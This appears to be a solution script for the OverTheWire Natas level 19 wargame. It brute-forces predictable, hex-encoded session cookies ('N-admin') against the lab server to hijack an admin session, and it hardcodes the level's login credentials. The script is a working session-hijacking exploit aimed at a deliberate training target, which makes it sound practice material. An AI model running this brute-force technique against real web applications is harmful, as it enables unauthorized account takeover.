#!/usr/bin/python3

import binascii
import requests

s = requests.Session()
s.auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

r=s.get('http://natas18.natas.labs.overthewire.org')


for i in range(1000):
	t = str(i) +"-admin"
	login = binascii.hexlify(t.encode('utf-8'))
	cookies = dict(PHPSESSID=login.decode('ascii'))
	r = s.get('http://natas19.natas.labs.overthewire.org/index.php', cookies=cookies)
	if "Login as an admin to retrieve credentials" in r.text:
		pass
	else:
		print(r.text)
		break
